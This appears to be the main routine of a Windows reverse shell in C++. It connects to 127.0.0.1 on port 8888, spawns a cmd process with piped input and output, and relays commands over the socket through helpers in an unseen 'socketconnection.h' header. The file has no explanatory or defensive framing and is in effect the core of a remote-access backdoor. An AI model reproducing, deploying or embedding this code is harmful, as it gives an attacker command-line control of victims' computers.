#include "socketconnection.h"

int main() {
    const std::string ip = "127.0.0.1";
    const int port = 8888;

    if (!initWinsock()) return 1;
    SOCKET s = connectToServer(ip, port);
    if (s == INVALID_SOCKET) return 1;

    HANDLE hReadOut, hWriteOut, hReadIn, hWriteIn;
    PROCESS_INFORMATION pi;

    if (!launchCmdProcess(hReadOut, hWriteOut, hReadIn, hWriteIn, pi)) {
        closesocket(s);
        WSACleanup();
        return 1;
    }

    commandLoop(s, hReadOut, hWriteIn, ip, port);
    cleanup(s, hReadOut, hWriteIn, pi);
    return 0;
}